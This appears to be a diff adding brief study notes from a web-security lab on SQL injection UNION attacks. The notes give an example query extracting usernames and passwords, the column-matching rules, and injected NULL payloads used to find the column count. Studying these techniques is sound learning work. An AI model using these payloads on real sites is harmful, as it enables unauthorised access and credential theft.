@@ -1,0 +1,14 @@
+Selecting the data from tables.And then apply union attack to retrive potential data from tables.
+
+Query:
+select a,b from table1 UNION select username,password from users
+
+Rule:
+1. The number and the order of the columns must be the same in all query.
+2. The data type must be compatible.
+
+Analisys:
+1- ' UNION SELECT NULL-- (Internal Server Error).
+2- ' UNION SELECT NULL,NULL-- (Internal Server Error).
+3. ' UNION SELECT NULL,NULL,NULL-- 
+(Congratulations, you solved the lab!) So we have 3 coloums.
